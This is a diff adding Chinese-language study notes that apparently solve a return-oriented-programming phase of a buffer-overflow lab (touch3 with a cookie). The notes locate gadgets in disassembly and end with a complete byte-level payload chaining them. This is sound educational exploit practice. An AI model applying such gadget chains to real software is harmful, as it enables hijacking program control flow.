@@ -1,0 +1,93 @@
+因为要放cookie的地址了，然后又因为栈随机化，思考如何获得rsp的指针，如果能获得就直接放栈上面pop出去即可
+
+402243:	c7 07 78 9b 58 90    	movl   $0x90589b78,(%rdi)
+402249:	c3                   	ret   
+
+pop rax 地址：402247
+58
+
+找到了都是将rsp指针放入rax的
+40235e:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
+48的地址开始为
+402360
+
+可惜没有push指令，不然简单了
+
+然后因为要ret，所以地址要返回ret的地址之后，又因为要add，找add又没有，所以不能加
+然后看到了个lea指令
+  402262:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+
+他不像其他的lea固定了立即数，可以自己填，那就可以做了
+先得到rsp的指针，然后存入rdi，在rsi中存入要便宜的多少，然后就可以了
+又因为pop指令只有pop rax，那就要找mov rax 到 rdi， rsi的指令
+40220d:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+
+mov rax rdi 地址：40220f
+48 89 c7
+
+mov rax rsi，rdi rsi找不着，找找四字节的移动试试
+
+402301:	b8 ac 89 d6 c3       	mov    $0xc3d689ac,%eax
+
+mov edx esi  地址: 402303
+89 d6 90 c3
+
+接着找怎么到edx
+
+40226b:	c7 07 89 ca 84 d2    	movl   $0xd284ca89,(%rdi)
+
+mov ecx edx 地址: 40226d
+89 ca
+
+后面的84 d2为test，不影响
+接着找移动到ecx的
+
+  402353:	8d 87 89 c1 38 c9    	lea    -0x36c73e77(%rdi),%eax
+  402359:	c3                   	ret 
+
+mov eax ecx 地址：402355
+89 c1
+
+后面的38 c9为cmp，不影响
+
+现在找全了所需要的东西，列个草稿看下怎么弄
+pop rax 地址：402247
+
+mov rsp rax 地址：402360
+
+lea    (%rdi,%rsi,1),%rax 地址：402262
+
+mov rax rdi 地址：40220f
+
+mov eax ecx 地址：402355
+mov ecx edx 地址: 40226d
+mov edx esi  地址: 402303
+
+
+
+
+
+mov rsp rax     注意这里的rsp的地址指向的是mov rax rdi，因为上一条ret返回时把这一行弹出了
+mov rax rdi
+lea    (%rdi,%rsi,1),%rax
+mov rax rdi
+touch3
+cookie
+
+因此rax 要 + 32
+
+
+pop rax                         47 22 40 00 00 00 00 00
+32                              20 00 00 00 00 00 00 00
+mov eax ecx                     55 23 40 00 00 00 00 00
+mov ecx edx                     6d 22 40 00 00 00 00 00
+mov edx esi                     03 23 40 00 00 00 00 00
+
+mov rsp rax                     60 23 40 00 00 00 00 00
+mov rax rdi                     0f 22 40 00 00 00 00 00
+lea    (%rdi,%rsi,1),%rax       62 22 40 00 00 00 00 00
+mov rax rdi                     0f 22 40 00 00 00 00 00
+touch3                          70 20 40 00 00 00 00 00
+cookie                          35 39 38 61 64 66 63 32
+
+
